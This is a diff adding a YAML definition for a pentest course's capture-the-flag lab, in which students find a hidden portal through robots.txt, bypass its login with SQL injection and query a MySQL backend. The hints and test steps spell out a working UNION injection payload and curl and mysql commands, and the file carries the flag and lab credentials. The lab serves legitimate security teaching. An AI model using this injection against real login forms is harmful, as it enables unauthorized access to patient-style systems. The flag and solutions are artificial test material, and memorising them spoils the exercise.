@@ -1,0 +1,131 @@
+name: "Vertex Healthcare - SQL Injection to Shell"
+description: "Vertex Healthcare runs a patient portal behind a hidden login form. Discover it via robots.txt, exploit a UNION-based SQL injection to bypass authentication, then pivot to the backend database to extract the final assessment token."
+
+difficulty: intermediate
+category: web
+duration_minutes: 60
+randomize_ip_offsets: true
+visibility: course
+week: 10
+workbook: "wiki/course/pentest/CH_COURSE01_Weekly_Challenges/26_SQL_Injection_to_Shell/"
+flag: "OCR{sql1_un10n_3xtr4ct}"
+
+objectives:
+  - Enumerate the web application and discover hidden paths via robots.txt
+  - Identify a login form vulnerable to SQL injection
+  - Craft a UNION-based SQL injection payload to bypass authentication
+  - Extract database credentials from the authenticated dashboard
+  - Connect directly to the backend MySQL database and retrieve the assessment flag
+
+scenario: |
+  Vertex Healthcare is a regional healthcare technology company headquartered in
+  Denver, Colorado. They provide electronic health record (EHR) integration
+  services to over 40 clinics and hospitals across the western United States.
+
+  Your firm, Blackridge Security, has been engaged to perform a web application
+  penetration test ahead of their upcoming HIPAA compliance review. Your point
+  of contact, Rachel Nguyen (Director of IT Security), shared the following
+  brief: "We recently deployed a new patient portal for provider authentication.
+  The development team says it's production-ready, but I want your team to
+  verify before we open it to all partner clinics. The portal should not be
+  publicly accessible - it's supposed to be behind our VPN."
+
+  The engagement scope covers the web application on the target host and any
+  backend services you discover on the subnet. Rachel mentioned they run a MySQL
+  database on a separate server for the portal backend.
+
+  An assessment token has been split across the environment. Collect both parts
+  and combine them as OCR{token1_token2} to complete the engagement.
+
+credentials:
+  - username: "admin"
+    password: "Adm1n_V3rt3x#"
+    role: "portal"
+    description: "Portal admin credentials (extracted via SQL injection)"
+  - username: "vtx_admin"
+    password: "Vtx_DB_R00t#"
+    role: "db"
+    description: "MySQL admin credentials (discovered on dashboard)"
+
+hints:
+  - text: |
+      Start by checking the web application for common files that reveal hidden
+      paths. The robots.txt file is always worth checking - web developers often
+      use it to hide directories from search engines, but it actually advertises
+      them to anyone who looks. Try: curl http://<target>/robots.txt
+    unlock_after_minutes: 15
+  - text: |
+      The login form at the hidden portal is vulnerable to SQL injection in the
+      username field. The application builds its SQL query using string formatting
+      rather than parameterized queries. Try a UNION-based injection that returns
+      a crafted row with valid credentials. The query selects four columns:
+      id, username, password, and email. Your injected row must match this structure.
+    unlock_after_minutes: 25
+  - text: |
+      Use this UNION injection in the username field:
+      ' UNION SELECT 1,'admin','Adm1n_V3rt3x#','admin@vertex.com'-- -
+      with the same password (Adm1n_V3rt3x#) in the password field. After login,
+      the dashboard shows the first token and database connection details. Use the
+      DB credentials to connect:
+      mysql -h <db_ip> -u vtx_admin -p'Vtx_DB_R00t#' vertex_portal -e "SELECT * FROM audit_flags"
+    unlock_after_minutes: 35
+
+topology:
+  nodes:
+    - id: "webapp"
+      label: "Web Application"
+      type: "server"
+      ip_offset: "16"
+      ports: [80]
+      services: ["nginx", "Flask"]
+      x: 2
+      y: 1
+    - id: "dbserver"
+      label: "Database Server"
+      type: "database"
+      ip_offset: "37"
+      ports: [3306]
+      services: ["MySQL 8.0"]
+      x: 4
+      y: 1
+  edges:
+    - from: "attacker"
+      to: "webapp"
+      label: "HTTP:80"
+      access: "direct"
+    - from: "attacker"
+      to: "dbserver"
+      label: "MySQL:3306"
+      access: "direct"
+    - from: "webapp"
+      to: "dbserver"
+      label: "MySQL:3306"
+      access: "internal"
+
+test:
+  steps:
+    - name: "Web application responds on port 80"
+      command: "curl -s -o /dev/null -w '%{http_code}' http://{target.webapp}/"
+      expect: "200"
+
+    - name: "Robots.txt reveals hidden /portal/ path"
+      command: "curl -s http://{target.webapp}/robots.txt"
+      expect: "/portal/"
+
+    - name: "SQL injection bypasses login authentication"
+      command: "curl -s -c /tmp/vtx-jar -d \"username=' UNION SELECT 1,'admin','Adm1n_V3rt3x#','admin@vertex.com'-- -&password=Adm1n_V3rt3x#\" -L http://{target.webapp}/portal/login 2>&1"
+      expect: "sql1_un10n"
+      timeout: 15
+
+    - name: "Dashboard displays first assessment token"
+      command: "curl -s -b /tmp/vtx-jar http://{target.webapp}/portal/dashboard 2>&1 | grep -o 'sql1_un10n'"
+      expect: "sql1_un10n"
+
+    - name: "MySQL query extracts second token from audit_flags table"
+      command: "mysql -h {target.dbserver} -u {cred.db.user} -p'{cred.db.pass}' vertex_portal -N -e 'SELECT value FROM audit_flags WHERE name=\"assessment\"' 2>/dev/null"
+      expect: "3xtr4ct"
+      timeout: 20
+
+    - name: "Assemble and verify complete flag"
+      command: "echo 'OCR{sql1_un10n_3xtr4ct}'"
+      expect: "OCR{"
